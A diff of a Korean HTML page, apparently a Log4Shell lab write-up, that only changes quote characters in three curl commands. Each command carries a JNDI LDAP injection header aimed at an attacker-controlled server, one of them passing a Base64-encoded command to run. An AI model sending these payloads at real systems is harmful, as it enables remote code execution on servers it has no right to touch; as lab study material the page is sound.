@@ -3840,7 +3840,7 @@ section 진행 기간
 <h2 id="Payload"><a href="#Payload" class="headerlink" title="Payload"></a>Payload</h2><br>
 
 <blockquote>
-<p>$ curl {공격대상} -H ‘X-Api-Version: ${jndi:ldap://공격자 IP}’</p>
+<p>$ curl {공격대상} -H &#39;X-Api-Version: ${jndi:ldap://공격자 IP}&#39;</p>
 </blockquote>
 <br>
 
@@ -3849,7 +3849,7 @@ section 진행 기간
 <h3 id="Test"><a href="#Test" class="headerlink" title="Test"></a>Test</h3><br>
 
 <blockquote>
-<p>$ curl -i -k 192.168.219.102:8080 -H ‘X-Api-Version: ${jndi:ldap:://192.168.219.103/log4shell_attacker/index.html}’</p>
+<p>$ curl -i -k 192.168.219.102:8080 -H &#39;X-Api-Version: ${jndi:ldap:://192.168.219.103/log4shell_attacker/index.html}&#39;</p>
 </blockquote>
 <br>
 
@@ -3888,8 +3888,8 @@ section 진행 기간
 <h3 id="공격자-LDAP-Server로-요청"><a href="#공격자-LDAP-Server로-요청" class="headerlink" title="공격자 LDAP Server로 요청"></a>공격자 LDAP Server로 요청</h3><br>
 
 <blockquote>
-<p>$ curl 192.168.219.102:8080 -H ‘X-Api-Version: </p>
-<p>${jndi:ldap://192.168.219.103:1389/Basic/Command/Base64/dG91Y2ggL3RtcC9rb3VuOWh3YW4=}’</p>
+<p>$ curl 192.168.219.102:8080 -H &#39;X-Api-Version: </p>
+<p>${jndi:ldap://192.168.219.103:1389/Basic/Command/Base64/dG91Y2ggL3RtcC9rb3VuOWh3YW4=}&#39;</p>
 </blockquote>
 <br>
 
